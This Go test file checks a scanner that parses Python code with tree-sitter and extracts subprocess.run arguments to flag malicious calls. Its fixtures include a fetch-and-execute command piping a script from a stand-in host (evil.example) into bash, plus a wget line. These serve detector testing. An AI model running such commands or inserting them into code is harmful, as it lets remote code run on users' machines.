package astscan

import (
	"strings"
	"testing"

	tree_sitter "github.com/tree-sitter/go-tree-sitter"
	python "github.com/tree-sitter/tree-sitter-python/bindings/go"
)

// 解析 Python 脚本，提取 subprocess.run 的第一个参数列表内容。
func findSubprocessArgs(t *testing.T, src string) []string {
	t.Helper()
	parser := tree_sitter.NewParser()
	defer parser.Close()
	parser.SetLanguage(tree_sitter.NewLanguage(python.Language()))
	tree := parser.Parse([]byte(src), nil)
	defer tree.Close()

	var args []string
	var walk func(node *tree_sitter.Node)
	walk = func(node *tree_sitter.Node) {
		if node.Kind() == "call" {
			funcName := node.ChildByFieldName("function")
			if funcName != nil && funcName.Kind() == "attribute" {
				if attr := funcName.ChildByFieldName("attribute"); attr != nil && attr.Kind() == "identifier" {
					if attr.Utf8Text([]byte(src)) == "run" {
						if argsNode := node.ChildByFieldName("arguments"); argsNode != nil {
							args = append(args, strings.Join(strings.Fields(argsNode.Utf8Text([]byte(src))), " "))
						}
					}
				}
			}
		}
		for i := uint(0); i < node.ChildCount(); i++ {
			walk(node.Child(i))
		}
	}
	walk(tree.RootNode())
	return args
}

// 恶意：subprocess.run 执行 curl | bash
func TestParseMaliciousSubprocess(t *testing.T) {
	src := `
import subprocess
result = subprocess.run(["bash", "-c", "curl -s http://evil.example/x.sh | bash"])
`
	args := findSubprocessArgs(t, src)
	if len(args) != 1 {
		t.Fatalf("found %d subprocess.run calls, want 1: %v", len(args), args)
	}
	if !strings.Contains(args[0], "curl") || !strings.Contains(args[0], "bash") {
		t.Fatalf("malicious args not detected: %q", args[0])
	}
}

// 良性：subprocess.run 调用 soffice（文档转换）
func TestParseBenignSubprocess(t *testing.T) {
	src := `
import subprocess
result = subprocess.run(["soffice", "--headless", "--convert-to", "pdf"])
`
	args := findSubprocessArgs(t, src)
	if len(args) != 1 {
		t.Fatalf("found %d calls, want 1", len(args))
	}
	if strings.Contains(args[0], "curl") {
		t.Fatalf("benign args misclassified: %q", args[0])
	}
}

// 多个调用都要找到
func TestParseMultipleSubprocess(t *testing.T) {
	src := `
subprocess.run(["soffice", "x.docx"])
subprocess.run(["bash", "-c", "wget evil"])
`
	args := findSubprocessArgs(t, src)
	if len(args) != 2 {
		t.Fatalf("found %d calls, want 2: %v", len(args), args)
	}
}
